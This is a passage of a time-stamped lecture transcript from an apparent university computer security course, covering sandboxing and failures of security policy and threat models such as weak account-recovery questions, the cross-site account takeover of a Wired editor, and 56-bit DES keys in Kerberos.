            <slice>
              <time_slice>13:43</time_slice>
              <text_slice>As one example, the browser used
to be fairly boring in terms</text_slice>
            </slice>
            <slice>
              <time_slice>13:46</time_slice>
              <text_slice>of what you could do with it.</text_slice>
            </slice>
            <slice>
              <time_slice>13:47</time_slice>
              <text_slice>You could just view
web pages, maybe</text_slice>
            </slice>
            <slice>
              <time_slice>13:49</time_slice>
              <text_slice>run some JavaScript code in it.</text_slice>
            </slice>
            <slice>
              <time_slice>13:50</time_slice>
              <text_slice>But now there's all
these cool mechanisms</text_slice>
            </slice>
            <slice>
              <time_slice>13:52</time_slice>
              <text_slice>we'll learn about
in a couple of weeks</text_slice>
            </slice>
            <slice>
              <time_slice>13:54</time_slice>
              <text_slice>that allow you to run arbitrary
x86 native code in the web</text_slice>
            </slice>
            <slice>
              <time_slice>13:57</time_slice>
              <text_slice>browser and make
sure it doesn't do</text_slice>
            </slice>
            <slice>
              <time_slice>13:59</time_slice>
              <text_slice>anything funny to your machine.</text_slice>
            </slice>
            <slice>
              <time_slice>14:01</time_slice>
              <text_slice>And it can send-- and
there's a technique or system</text_slice>
            </slice>
            <slice>
              <time_slice>14:04</time_slice>
              <text_slice>called Native Client
from Google that actually</text_slice>
            </slice>
            <slice>
              <time_slice>14:06</time_slice>
              <text_slice>allows us to do this securely.</text_slice>
            </slice>
            <slice>
              <time_slice>14:08</time_slice>
              <text_slice>And before, in order to run some
native game on your machine,</text_slice>
            </slice>
            <slice>
              <time_slice>14:11</time_slice>
              <text_slice>you'd have download and install
it, click on lot's of dialogue</text_slice>
            </slice>
            <slice>
              <time_slice>14:13</time_slice>
              <text_slice>boxes, say yes, I allow this.</text_slice>
            </slice>
            <slice>
              <time_slice>14:15</time_slice>
              <text_slice>But now, you can just
run it in a browser,</text_slice>
            </slice>
            <slice>
              <time_slice>14:17</time_slice>
              <text_slice>no clicking required.</text_slice>
            </slice>
            <slice>
              <time_slice>14:18</time_slice>
              <text_slice>It just runs.</text_slice>
            </slice>
            <slice>
              <time_slice>14:19</time_slice>
              <text_slice>And the reason it's
so easy and powerful</text_slice>
            </slice>
            <slice>
              <time_slice>14:22</time_slice>
              <text_slice>is that our security mechanism
can sandbox this program</text_slice>
            </slice>
            <slice>
              <time_slice>14:25</time_slice>
              <text_slice>and not have to assume anything
about the user choosing</text_slice>
            </slice>
            <slice>
              <time_slice>14:29</time_slice>
              <text_slice>the right game and not
some malicious game to play</text_slice>
            </slice>
            <slice>
              <time_slice>14:31</time_slice>
              <text_slice>in their computer, or
some other program to run.</text_slice>
            </slice>
            <slice>
              <time_slice>14:34</time_slice>
              <text_slice>So in many ways, good
security mechanisms</text_slice>
            </slice>
            <slice>
              <time_slice>14:36</time_slice>
              <text_slice>are going to enable constructing
cool new systems that weren't</text_slice>
            </slice>
            <slice>
              <time_slice>14:40</time_slice>
              <text_slice>possible to construct before.</text_slice>
            </slice>
            <slice>
              <time_slice>14:43</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>14:44</time_slice>
              <text_slice>Make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>14:45</time_slice>
              <text_slice>Any questions about this story?</text_slice>
            </slice>
            <slice>
              <time_slice>14:50</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>14:51</time_slice>
              <text_slice>So I guess in the
rest of the lecture,</text_slice>
            </slice>
            <slice>
              <time_slice>14:54</time_slice>
              <text_slice>I want to go through a bunch
of different examples of how</text_slice>
            </slice>
            <slice>
              <time_slice>14:58</time_slice>
              <text_slice>security goes wrong.</text_slice>
            </slice>
            <slice>
              <time_slice>15:00</time_slice>
              <text_slice>So, so far, we've seen
how you can think of it.</text_slice>
            </slice>
            <slice>
              <time_slice>15:02</time_slice>
              <text_slice>But inevitably, it's
useful to see examples</text_slice>
            </slice>
            <slice>
              <time_slice>15:05</time_slice>
              <text_slice>of what not to do so that you
can have a better mindset when</text_slice>
            </slice>
            <slice>
              <time_slice>15:10</time_slice>
              <text_slice>you're approaching
security problems.</text_slice>
            </slice>
            <slice>
              <time_slice>15:12</time_slice>
              <text_slice>And in this sort of breakdown
of a security system,</text_slice>
            </slice>
            <slice>
              <time_slice>15:16</time_slice>
              <text_slice>pretty much every one of
these three things goes wrong.</text_slice>
            </slice>
            <slice>
              <time_slice>15:18</time_slice>
              <text_slice>In practice, people
get the policy wrong,</text_slice>
            </slice>
            <slice>
              <time_slice>15:20</time_slice>
              <text_slice>people get the
threat model wrong,</text_slice>
            </slice>
            <slice>
              <time_slice>15:22</time_slice>
              <text_slice>and people get the
mechanism wrong.</text_slice>
            </slice>
            <slice>
              <time_slice>15:23</time_slice>
              <text_slice>And let's, I guess, start
with policies and examples</text_slice>
            </slice>
            <slice>
              <time_slice>15:27</time_slice>
              <text_slice>of how you can screw
up a system's policy.</text_slice>
            </slice>
            <slice>
              <time_slice>15:31</time_slice>
              <text_slice>Maybe the cleanest or sort
of simplest example of this</text_slice>
            </slice>
            <slice>
              <time_slice>15:35</time_slice>
              <text_slice>are account recovery questions.</text_slice>
            </slice>
            <slice>
              <time_slice>15:41</time_slice>
              <text_slice>So typically, when you
sign into a website,</text_slice>
            </slice>
            <slice>
              <time_slice>15:46</time_slice>
              <text_slice>you provide a password.</text_slice>
            </slice>
            <slice>
              <time_slice>15:47</time_slice>
              <text_slice>But what happens if
you lose your password?</text_slice>
            </slice>
            <slice>
              <time_slice>15:49</time_slice>
              <text_slice>Some sites will send
you email if you</text_slice>
            </slice>
            <slice>
              <time_slice>15:52</time_slice>
              <text_slice>lose your password with a
link to reset your password.</text_slice>
            </slice>
            <slice>
              <time_slice>15:55</time_slice>
              <text_slice>So it's easy enough, if you
have another email address.</text_slice>
            </slice>
            <slice>
              <time_slice>15:57</time_slice>
              <text_slice>But what if this is
your email provider?</text_slice>
            </slice>
            <slice>
              <time_slice>15:59</time_slice>
              <text_slice>So at least, several
years ago, Yahoo</text_slice>
            </slice>
            <slice>
              <time_slice>16:03</time_slice>
              <text_slice>hosted email, webmail, for
anyone on the internet.</text_slice>
            </slice>
            <slice>
              <time_slice>16:06</time_slice>
              <text_slice>And when you forgot
your Yahoo password,</text_slice>
            </slice>
            <slice>
              <time_slice>16:08</time_slice>
              <text_slice>they couldn't really
send you email</text_slice>
            </slice>
            <slice>
              <time_slice>16:10</time_slice>
              <text_slice>because you couldn't get it.</text_slice>
            </slice>
            <slice>
              <time_slice>16:11</time_slice>
              <text_slice>So instead, they
had you register</text_slice>
            </slice>
            <slice>
              <time_slice>16:13</time_slice>
              <text_slice>a couple of questions with them
that hopefully only you know.</text_slice>
            </slice>
            <slice>
              <time_slice>16:16</time_slice>
              <text_slice>And if you forget your password,
you can click on a link</text_slice>
            </slice>
            <slice>
              <time_slice>16:18</time_slice>
              <text_slice>and say, well, here's the
answers to my questions.</text_slice>
            </slice>
            <slice>
              <time_slice>16:21</time_slice>
              <text_slice>Let me have my password again.</text_slice>
            </slice>
            <slice>
              <time_slice>16:23</time_slice>
              <text_slice>And what turns out to
be the case is-- well,</text_slice>
            </slice>
            <slice>
              <time_slice>16:26</time_slice>
              <text_slice>some people failed to realize is
that this changes your policy,</text_slice>
            </slice>
            <slice>
              <time_slice>16:30</time_slice>
              <text_slice>because before, the
policy of the system</text_slice>
            </slice>
            <slice>
              <time_slice>16:32</time_slice>
              <text_slice>is people that can log
in are the people that</text_slice>
            </slice>
            <slice>
              <time_slice>16:35</time_slice>
              <text_slice>know the password.</text_slice>
            </slice>
            <slice>
              <time_slice>16:36</time_slice>
              <text_slice>And when you introduce
these recovery questions,</text_slice>
            </slice>
            <slice>
              <time_slice>16:38</time_slice>
              <text_slice>the policy becomes,
well, you can log in</text_slice>
            </slice>
            <slice>
              <time_slice>16:40</time_slice>
              <text_slice>if you know either the password
or those security questions.</text_slice>
            </slice>
            <slice>
              <time_slice>16:44</time_slice>
              <text_slice>So it strictly weakens the
security of your system.</text_slice>
            </slice>
            <slice>
              <time_slice>16:47</time_slice>
              <text_slice>And many people have actually
taken advantage of this.</text_slice>
            </slice>
            <slice>
              <time_slice>16:49</time_slice>
              <text_slice>One sort of well known example
is, I think a couple years ago,</text_slice>
            </slice>
            <slice>
              <time_slice>16:53</time_slice>
              <text_slice>Sarah Palin had an
email account at Yahoo.</text_slice>
            </slice>
            <slice>
              <time_slice>16:55</time_slice>
              <text_slice>And her recovery questions
were things like, well,</text_slice>
            </slice>
            <slice>
              <time_slice>16:59</time_slice>
              <text_slice>where'd you go to school?</text_slice>
            </slice>
            <slice>
              <time_slice>17:00</time_slice>
              <text_slice>What was your friend's name?</text_slice>
            </slice>
            <slice>
              <time_slice>17:03</time_slice>
              <text_slice>What's your birthday?</text_slice>
            </slice>
            <slice>
              <time_slice>17:04</time_slice>
              <text_slice>Et cetera.</text_slice>
            </slice>
            <slice>
              <time_slice>17:04</time_slice>
              <text_slice>These were all things written
on her Wikipedia page.</text_slice>
            </slice>
            <slice>
              <time_slice>17:07</time_slice>
              <text_slice>And as a result, someone
can quite easily,</text_slice>
            </slice>
            <slice>
              <time_slice>17:09</time_slice>
              <text_slice>and someone did, actually, get
into her Yahoo email account</text_slice>
            </slice>
            <slice>
              <time_slice>17:12</time_slice>
              <text_slice>just by looking up on Wikipedia
what her high school was</text_slice>
            </slice>
            <slice>
              <time_slice>17:15</time_slice>
              <text_slice>and what her birthday was.</text_slice>
            </slice>
            <slice>
              <time_slice>17:17</time_slice>
              <text_slice>So you really have
to think carefully</text_slice>
            </slice>
            <slice>
              <time_slice>17:18</time_slice>
              <text_slice>about the implications
of different security</text_slice>
            </slice>
            <slice>
              <time_slice>17:21</time_slice>
              <text_slice>policies you're making here.</text_slice>
            </slice>
            <slice>
              <time_slice>17:24</time_slice>
              <text_slice>Perhaps a more intricate and,
maybe, interesting example,</text_slice>
            </slice>
            <slice>
              <time_slice>17:29</time_slice>
              <text_slice>is what happens when you have
multiple systems that start</text_slice>
            </slice>
            <slice>
              <time_slice>17:32</time_slice>
              <text_slice>interacting with one another.</text_slice>
            </slice>
            <slice>
              <time_slice>17:34</time_slice>
              <text_slice>So there's this nice story
about a guy called Mat Honan.</text_slice>
            </slice>
            <slice>
              <time_slice>17:39</time_slice>
              <text_slice>Maybe you read this
story a year or two ago.</text_slice>
            </slice>
            <slice>
              <time_slice>17:42</time_slice>
              <text_slice>He's a editor at this
wired.com magazine.</text_slice>
            </slice>
            <slice>
              <time_slice>17:45</time_slice>
              <text_slice>And had a bit of a problem.</text_slice>
            </slice>
            <slice>
              <time_slice>17:48</time_slice>
              <text_slice>Someone basically got
into his Gmail account</text_slice>
            </slice>
            <slice>
              <time_slice>17:50</time_slice>
              <text_slice>and did lots of bad things.</text_slice>
            </slice>
            <slice>
              <time_slice>17:52</time_slice>
              <text_slice>But how did they do it, right?</text_slice>
            </slice>
            <slice>
              <time_slice>17:53</time_slice>
              <text_slice>So it's kind of interesting.</text_slice>
            </slice>
            <slice>
              <time_slice>17:54</time_slice>
              <text_slice>So all parties in
this story seem</text_slice>
            </slice>
            <slice>
              <time_slice>17:57</time_slice>
              <text_slice>to be doing reasonable things.</text_slice>
            </slice>
            <slice>
              <time_slice>17:58</time_slice>
              <text_slice>But we'll see how they add
up to something unfortunate.</text_slice>
            </slice>
            <slice>
              <time_slice>18:01</time_slice>
              <text_slice>So we have Gmail.</text_slice>
            </slice>
            <slice>
              <time_slice>18:02</time_slice>
              <text_slice>And Gmail lets you
reset your password</text_slice>
            </slice>
            <slice>
              <time_slice>18:06</time_slice>
              <text_slice>if you forget, as do pretty
much every other system.</text_slice>
            </slice>
            <slice>
              <time_slice>18:09</time_slice>
              <text_slice>And the way you do
a reset at Gmail</text_slice>
            </slice>
            <slice>
              <time_slice>18:13</time_slice>
              <text_slice>is you send them
a reset request.</text_slice>
            </slice>
            <slice>
              <time_slice>18:16</time_slice>
              <text_slice>And what they say
is, well, you weren't</text_slice>
            </slice>
            <slice>
              <time_slice>18:19</time_slice>
              <text_slice>going to do this recovery
questions, at least</text_slice>
            </slice>
            <slice>
              <time_slice>18:21</time_slice>
              <text_slice>not for this guy.</text_slice>
            </slice>
            <slice>
              <time_slice>18:22</time_slice>
              <text_slice>What they do is they send you a
recovery link to a backup email</text_slice>
            </slice>
            <slice>
              <time_slice>18:24</time_slice>
              <text_slice>address, or some other
email address that you have.</text_slice>
            </slice>
            <slice>
              <time_slice>18:27</time_slice>
              <text_slice>And helpful, they actually
print the email address for you.</text_slice>
            </slice>
            <slice>
              <time_slice>18:29</time_slice>
              <text_slice>So for this guy's
account, someone</text_slice>
            </slice>
            <slice>
              <time_slice>18:31</time_slice>
              <text_slice>went and asked Gmail
to reset the password.</text_slice>
            </slice>
            <slice>
              <time_slice>18:32</time_slice>
              <text_slice>And they said, well, yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>18:33</time_slice>
              <text_slice>Sure.</text_slice>
            </slice>
            <slice>
              <time_slice>18:34</time_slice>
              <text_slice>We just sent the recovery
link to this email,</text_slice>
            </slice>
            <slice>
              <time_slice>18:37</time_slice>
              <text_slice>foo@me.com, which was
some Apple email service.</text_slice>
            </slice>
            <slice>
              <time_slice>18:42</time_slice>
              <text_slice>OK, but the bad guy doesn't
have access to me.com, either.</text_slice>
            </slice>
            <slice>
              <time_slice>18:44</time_slice>
              <text_slice>But they want to get
this password reset</text_slice>
            </slice>
            <slice>
              <time_slice>18:46</time_slice>
              <text_slice>link to get access to Gmail.</text_slice>
            </slice>
            <slice>
              <time_slice>18:48</time_slice>
              <text_slice>Well, the way things
worked was that,</text_slice>
            </slice>
            <slice>
              <time_slice>18:50</time_slice>
              <text_slice>in Apple's case,
this me.com site,</text_slice>
            </slice>
            <slice>
              <time_slice>18:55</time_slice>
              <text_slice>allowed you to actually reset
your password if you know</text_slice>
            </slice>
            <slice>
              <time_slice>19:00</time_slice>
              <text_slice>your billing address and the
last four digits of your credit</text_slice>
            </slice>
            <slice>
              <time_slice>19:03</time_slice>
              <text_slice>card number.</text_slice>
            </slice>
            <slice>
              <time_slice>19:05</time_slice>
              <text_slice>So it's still not clear how
you're going to get this</text_slice>
            </slice>
            <slice>
              <time_slice>19:07</time_slice>
              <text_slice>guy's-- well, home address,
maybe you could look it up</text_slice>
            </slice>
            <slice>
              <time_slice>19:10</time_slice>
              <text_slice>somewhere.</text_slice>
            </slice>
            <slice>
              <time_slice>19:11</time_slice>
              <text_slice>This guy was a well
known person at the time.</text_slice>
            </slice>
            <slice>
              <time_slice>19:12</time_slice>
              <text_slice>But where do you get the last
four digits of his credit card</text_slice>
            </slice>
            <slice>
              <time_slice>19:15</time_slice>
              <text_slice>number?</text_slice>
            </slice>
            <slice>
              <time_slice>19:16</time_slice>
              <text_slice>Well, not clear, but
let's keep going further.</text_slice>
            </slice>
            <slice>
              <time_slice>19:21</time_slice>
              <text_slice>So you need to send these
things to me.com to get access</text_slice>
            </slice>
            <slice>
              <time_slice>19:23</time_slice>
              <text_slice>to his email account there.</text_slice>
            </slice>
            <slice>
              <time_slice>19:25</time_slice>
              <text_slice>Well, it turns out this guy
had an account at Amazon, which</text_slice>
            </slice>
            <slice>
              <time_slice>19:28</time_slice>
              <text_slice>is another party in this story.</text_slice>
            </slice>
            <slice>
              <time_slice>19:31</time_slice>
              <text_slice>Amazon really wants
you to buy things.</text_slice>
            </slice>
            <slice>
              <time_slice>19:34</time_slice>
              <text_slice>And as a result, they actually
have a fairly elaborate account</text_slice>
            </slice>
            <slice>
              <time_slice>19:38</time_slice>
              <text_slice>management system.</text_slice>
            </slice>
            <slice>
              <time_slice>19:39</time_slice>
              <text_slice>And in particular, because they
really want you to buy stuff,</text_slice>
            </slice>
            <slice>
              <time_slice>19:42</time_slice>
              <text_slice>they don't require
you to sign in</text_slice>
            </slice>
            <slice>
              <time_slice>19:44</time_slice>
              <text_slice>in order to purchase some
item with a credit card.</text_slice>
            </slice>
            <slice>
              <time_slice>19:47</time_slice>
              <text_slice>So I can actually go on Amazon,
or at least at the time,</text_slice>
            </slice>
            <slice>
              <time_slice>19:50</time_slice>
              <text_slice>I was able to go on Amazon
and say, well, I'm this user.</text_slice>
            </slice>
            <slice>
              <time_slice>19:53</time_slice>
              <text_slice>And I want to buy this
pack of toothbrushes.</text_slice>
            </slice>
            <slice>
              <time_slice>19:57</time_slice>
              <text_slice>And if I wanted to use
the saved credit card</text_slice>
            </slice>
            <slice>
              <time_slice>20:00</time_slice>
              <text_slice>number in the guy's account, I
shouldn't be able to do this.</text_slice>
            </slice>
            <slice>
              <time_slice>20:02</time_slice>
              <text_slice>But if I just was providing a
new credit card, what Amazon</text_slice>
            </slice>
            <slice>
              <time_slice>20:05</time_slice>
              <text_slice>would do is, they can
actually add a new credit</text_slice>
            </slice>
            <slice>
              <time_slice>20:08</time_slice>
              <text_slice>card to some guy's account.</text_slice>
            </slice>
            <slice>
              <time_slice>20:13</time_slice>
              <text_slice>So that seems not
too bad, right?</text_slice>
            </slice>
            <slice>
              <time_slice>20:15</time_slice>
              <text_slice>I'm basically
ordering toothbrushes</text_slice>
            </slice>
            <slice>
              <time_slice>20:17</time_slice>
              <text_slice>through one of your
Amazon accounts.</text_slice>
            </slice>
            <slice>
              <time_slice>20:18</time_slice>
              <text_slice>But it's not your
credit card anyway.</text_slice>
            </slice>
            <slice>
              <time_slice>20:20</time_slice>
              <text_slice>It's just my credit
card number being used.</text_slice>
            </slice>
            <slice>
              <time_slice>20:22</time_slice>
              <text_slice>So it's not clear how
things go wrong yet.</text_slice>
            </slice>
            <slice>
              <time_slice>20:24</time_slice>
              <text_slice>But Amazon had
another interface.</text_slice>
            </slice>
            <slice>
              <time_slice>20:26</time_slice>
              <text_slice>All these are
complicated systems.</text_slice>
            </slice>
            <slice>
              <time_slice>20:28</time_slice>
              <text_slice>And Amazon had an interface
for password reset.</text_slice>
            </slice>
            <slice>
              <time_slice>20:31</time_slice>
              <text_slice>And in order to reset
a password in Amazon,</text_slice>
            </slice>
            <slice>
              <time_slice>20:34</time_slice>
              <text_slice>what you had to provide is just
one of the user's credit card</text_slice>
            </slice>
            <slice>
              <time_slice>20:38</time_slice>
              <text_slice>numbers.</text_slice>
            </slice>
            <slice>
              <time_slice>20:39</time_slice>
              <text_slice>So I can order stuff and
add a credit card number</text_slice>
            </slice>
            <slice>
              <time_slice>20:42</time_slice>
              <text_slice>to your account.</text_slice>
            </slice>
            <slice>
              <time_slice>20:43</time_slice>
              <text_slice>And then I can say, hey, I
want to reset my password.</text_slice>
            </slice>
            <slice>
              <time_slice>20:45</time_slice>
              <text_slice>This is one of my
credit card numbers.</text_slice>
            </slice>
            <slice>
              <time_slice>20:46</time_slice>
              <text_slice>And this, in fact, worked.</text_slice>
            </slice>
            <slice>
              <time_slice>20:48</time_slice>
              <text_slice>So this is where the bad guy
got a hold of this guy's, Mat's,</text_slice>
            </slice>
            <slice>
              <time_slice>20:53</time_slice>
              <text_slice>Amazon account.</text_slice>
            </slice>
            <slice>
              <time_slice>20:54</time_slice>
              <text_slice>But OK.</text_slice>
            </slice>
            <slice>
              <time_slice>20:55</time_slice>
              <text_slice>How do you fish out
the credit card number</text_slice>
            </slice>
            <slice>
              <time_slice>20:57</time_slice>
              <text_slice>for resetting Apple's site?</text_slice>
            </slice>
            <slice>
              <time_slice>20:59</time_slice>
              <text_slice>Well, Amazon was
actually very careful.</text_slice>
            </slice>
            <slice>
              <time_slice>21:01</time_slice>
              <text_slice>Even if you break into
someone's Amazon account,</text_slice>
            </slice>
            <slice>
              <time_slice>21:03</time_slice>
              <text_slice>it will not print you
the saved credit card</text_slice>
            </slice>
            <slice>
              <time_slice>21:05</time_slice>
              <text_slice>numbers from that person.</text_slice>
            </slice>
            <slice>
              <time_slice>21:07</time_slice>
              <text_slice>But it will show the
last four digits.</text_slice>
            </slice>
            <slice>
              <time_slice>21:09</time_slice>
              <text_slice>Just so you know which credit
card you're talking about.</text_slice>
            </slice>
            <slice>
              <time_slice>21:11</time_slice>
              <text_slice>So you can list all the credit
cards, other than the one</text_slice>
            </slice>
            <slice>
              <time_slice>21:14</time_slice>
              <text_slice>you added.</text_slice>
            </slice>
            <slice>
              <time_slice>21:14</time_slice>
              <text_slice>You can then go and
break into me.com.</text_slice>
            </slice>
            <slice>
              <time_slice>21:16</time_slice>
              <text_slice>You can click on this
link and get access</text_slice>
            </slice>
            <slice>
              <time_slice>21:19</time_slice>
              <text_slice>to the guy's Gmail account.</text_slice>
            </slice>
            <slice>
              <time_slice>21:21</time_slice>
              <text_slice>This is all very subtle stuff.</text_slice>
            </slice>
            <slice>
              <time_slice>21:22</time_slice>
              <text_slice>And in isolation,
each system seems</text_slice>
            </slice>
            <slice>
              <time_slice>21:24</time_slice>
              <text_slice>to be doing somewhat
sensible things.</text_slice>
            </slice>
            <slice>
              <time_slice>21:26</time_slice>
              <text_slice>But it's actually
quite hard to reason</text_slice>
            </slice>
            <slice>
              <time_slice>21:28</time_slice>
              <text_slice>about these vulnerabilities
and weaknesses</text_slice>
            </slice>
            <slice>
              <time_slice>21:31</time_slice>
              <text_slice>unless you have this whole
picture explained to you</text_slice>
            </slice>
            <slice>
              <time_slice>21:34</time_slice>
              <text_slice>and you've sort of put
all the pieces together.</text_slice>
            </slice>
            <slice>
              <time_slice>21:37</time_slice>
              <text_slice>So this is actually
fairly tricky stuff.</text_slice>
            </slice>
            <slice>
              <time_slice>21:41</time_slice>
              <text_slice>And unfortunately, well,
much like for every one</text_slice>
            </slice>
            <slice>
              <time_slice>21:45</time_slice>
              <text_slice>of these three categories, the
answer for how to avoid this</text_slice>
            </slice>
            <slice>
              <time_slice>21:47</time_slice>
              <text_slice>is often think hard
and be careful.</text_slice>
            </slice>
            <slice>
              <time_slice>21:50</time_slice>
              <text_slice>I guess the one general plan
is, be conservative in terms</text_slice>
            </slice>
            <slice>
              <time_slice>21:54</time_slice>
              <text_slice>of what you set
your policy to be,</text_slice>
            </slice>
            <slice>
              <time_slice>21:57</time_slice>
              <text_slice>to maybe not depend on things
other sites might reveal.</text_slice>
            </slice>
            <slice>
              <time_slice>22:01</time_slice>
              <text_slice>So well, I'm not sure if any
really great advice would</text_slice>
            </slice>
            <slice>
              <time_slice>22:05</time_slice>
              <text_slice>have prevented this problem.</text_slice>
            </slice>
            <slice>
              <time_slice>22:06</time_slice>
              <text_slice>But now you know.</text_slice>
            </slice>
            <slice>
              <time_slice>22:07</time_slice>
              <text_slice>And now you'll make
other mistakes.</text_slice>
            </slice>
            <slice>
              <time_slice>22:11</time_slice>
              <text_slice>There's many other
examples of policies</text_slice>
            </slice>
            <slice>
              <time_slice>22:13</time_slice>
              <text_slice>going wrong and allowing a
system to be compromised.</text_slice>
            </slice>
            <slice>
              <time_slice>22:18</time_slice>
              <text_slice>That's interesting enough.</text_slice>
            </slice>
            <slice>
              <time_slice>22:19</time_slice>
              <text_slice>But let's look at how people
might screw up threat models.</text_slice>
            </slice>
            <slice>
              <time_slice>22:22</time_slice>
              <text_slice>So let me turn off
this blue square.</text_slice>
            </slice>
            <slice>
              <time_slice>22:28</time_slice>
              <text_slice>OK.</text_slice>
            </slice>
            <slice>
              <time_slice>22:28</time_slice>
              <text_slice>So what are examples of
threat models that go wrong?</text_slice>
            </slice>
            <slice>
              <time_slice>22:36</time_slice>
              <text_slice>Well, probably a big one in
practice is human factors.</text_slice>
            </slice>
            <slice>
              <time_slice>22:42</time_slice>
              <text_slice>So we often make
assumptions about what</text_slice>
            </slice>
            <slice>
              <time_slice>22:45</time_slice>
              <text_slice>people will do in
a system, like they</text_slice>
            </slice>
            <slice>
              <time_slice>22:49</time_slice>
              <text_slice>will pick a good,
strong password,</text_slice>
            </slice>
            <slice>
              <time_slice>22:51</time_slice>
              <text_slice>or they will not click
on random websites</text_slice>
            </slice>
            <slice>
              <time_slice>22:53</time_slice>
              <text_slice>that they get through email
and enter their password there.</text_slice>
            </slice>
            <slice>
              <time_slice>22:56</time_slice>
              <text_slice>So these are-- well, as
you probably suspect,</text_slice>
            </slice>
            <slice>
              <time_slice>22:59</time_slice>
              <text_slice>and in practice,
happens to be the case,</text_slice>
            </slice>
            <slice>
              <time_slice>23:01</time_slice>
              <text_slice>these are not good
assumptions in all cases.</text_slice>
            </slice>
            <slice>
              <time_slice>23:03</time_slice>
              <text_slice>And people pick bad passwords.</text_slice>
            </slice>
            <slice>
              <time_slice>23:06</time_slice>
              <text_slice>And people will click
on random links.</text_slice>
            </slice>
            <slice>
              <time_slice>23:08</time_slice>
              <text_slice>And people will
enter their password</text_slice>
            </slice>
            <slice>
              <time_slice>23:10</time_slice>
              <text_slice>on sites that are actually
not the right site at all.</text_slice>
            </slice>
            <slice>
              <time_slice>23:13</time_slice>
              <text_slice>And they will not be
paying a lot of attention.</text_slice>
            </slice>
            <slice>
              <time_slice>23:16</time_slice>
              <text_slice>So you probably don't want
to have threat models that</text_slice>
            </slice>
            <slice>
              <time_slice>23:19</time_slice>
              <text_slice>make very strong
assumptions about what</text_slice>
            </slice>
            <slice>
              <time_slice>23:21</time_slice>
              <text_slice>humans will do because
inevitably, something</text_slice>
            </slice>
            <slice>
              <time_slice>23:23</time_slice>
              <text_slice>will go wrong.</text_slice>
            </slice>
            <slice>
              <time_slice>23:25</time_slice>
              <text_slice>Make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>23:26</time_slice>
              <text_slice>Any questions?</text_slice>
            </slice>
            <slice>
              <time_slice>23:29</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>23:29</time_slice>
              <text_slice>Another sort of good thing
to watch out in threat models</text_slice>
            </slice>
            <slice>
              <time_slice>23:32</time_slice>
              <text_slice>is that they sometimes
change over time.</text_slice>
            </slice>
            <slice>
              <time_slice>23:35</time_slice>
              <text_slice>Or whether something is
a good assumption or not</text_slice>
            </slice>
            <slice>
              <time_slice>23:38</time_slice>
              <text_slice>changes over time.</text_slice>
            </slice>
            <slice>
              <time_slice>23:40</time_slice>
              <text_slice>One example of this is actually
at MIT in the mid '90s-- mid</text_slice>
            </slice>
            <slice>
              <time_slice>23:45</time_slice>
              <text_slice>'80s, actually--
Project Athena developed</text_slice>
            </slice>
            <slice>
              <time_slice>23:48</time_slice>
              <text_slice>this system called Kerberos.</text_slice>
            </slice>
            <slice>
              <time_slice>23:49</time_slice>
              <text_slice>And we'll read about this in a
couple of weeks in this class.</text_slice>
            </slice>
            <slice>
              <time_slice>23:52</time_slice>
              <text_slice>And at the time, they were sort
of figuring out, well, Kerberos</text_slice>
            </slice>
            <slice>
              <time_slice>23:55</time_slice>
              <text_slice>is going to be based
on cryptography.</text_slice>
            </slice>
            <slice>
              <time_slice>23:57</time_slice>
              <text_slice>So we need to pick
some size keys</text_slice>
            </slice>
            <slice>
              <time_slice>23:59</time_slice>
              <text_slice>to make sure they're
not going to be</text_slice>
            </slice>
            <slice>
              <time_slice>24:00</time_slice>
              <text_slice>guessed by arbitrary people.</text_slice>
            </slice>
            <slice>
              <time_slice>24:02</time_slice>
              <text_slice>And they said, OK.</text_slice>
            </slice>
            <slice>
              <time_slice>24:03</time_slice>
              <text_slice>Well you know, 56-bit
keys, at the time,</text_slice>
            </slice>
            <slice>
              <time_slice>24:06</time_slice>
              <text_slice>for this cypher called DES,
seemed like a plausible size.</text_slice>
            </slice>
            <slice>
              <time_slice>24:09</time_slice>
              <text_slice>Maybe not great, but certainly
not entirely unreasonable.</text_slice>
            </slice>
            <slice>
              <time_slice>24:13</time_slice>
              <text_slice>And this was in the mid '80s.</text_slice>
            </slice>
            <slice>
              <time_slice>24:14</time_slice>
              <text_slice>But then you know, this system
got popular and got used a lot.</text_slice>
            </slice>
            <slice>
              <time_slice>24:17</time_slice>
              <text_slice>MIT still uses it.</text_slice>
            </slice>
            <slice>
              <time_slice>24:19</time_slice>
              <text_slice>And they never really went
back to seriously revisit</text_slice>
            </slice>
            <slice>
              <time_slice>24:22</time_slice>
              <text_slice>this assumption.</text_slice>
            </slice>
            <slice>
              <time_slice>24:23</time_slice>
              <text_slice>And then, a couple years ago,
a group of 6.858 students</text_slice>
            </slice>
            <slice>
              <time_slice>24:27</time_slice>
              <text_slice>figured out that actually, yeah,
you can just break this, right?</text_slice>
            </slice>
            <slice>
              <time_slice>24:29</time_slice>
              <text_slice>It's easy enough to enumerate
all the 256 keys these days.</text_slice>
            </slice>
            <slice>
              <time_slice>24:34</time_slice>
              <text_slice>Computers are so fast,
you can just do it.</text_slice>
            </slice>
            <slice>
              <time_slice>24:36</time_slice>
              <text_slice>And as a result,
they were able to,</text_slice>
            </slice>
            <slice>
              <time_slice>24:38</time_slice>
              <text_slice>with the help of some
hardware from a particular web</text_slice>
            </slice>
            <slice>
              <time_slice>24:42</time_slice>
              <text_slice>service-- we'll have some links
the lecture notes-- they were</text_slice>
            </slice>
            <slice>
              <time_slice>24:45</time_slice>
              <text_slice>able to get, basically, anyone's
Kerberos account key in roughly</text_slice>
            </slice>
            <slice>
              <time_slice>24:50</time_slice>
              <text_slice>a day.</text_slice>
            </slice>
            <slice>
              <time_slice>24:51</time_slice>
              <text_slice>And so this assumption
was good in the mid 1980s.</text_slice>
            </slice>
            <slice>
              <time_slice>24:55</time_slice>
              <text_slice>No longer a good
assumption today.</text_slice>
            </slice>
            <slice>
              <time_slice>24:57</time_slice>
              <text_slice>So you really have to
make sure your assumptions</text_slice>
            </slice>
            <slice>
              <time_slice>24:59</time_slice>
              <text_slice>sort of keep up with the times.</text_slice>
            </slice>
            <slice>
              <time_slice>25:02</time_slice>
              <text_slice>Maybe a more timely example
is, if your adversary--</text_slice>
            </slice>
            <slice>
              <time_slice>25:06</time_slice>
              <text_slice>or if you're worried
about government attacks,</text_slice>
            </slice>
            <slice>
              <time_slice>25:08</time_slice>
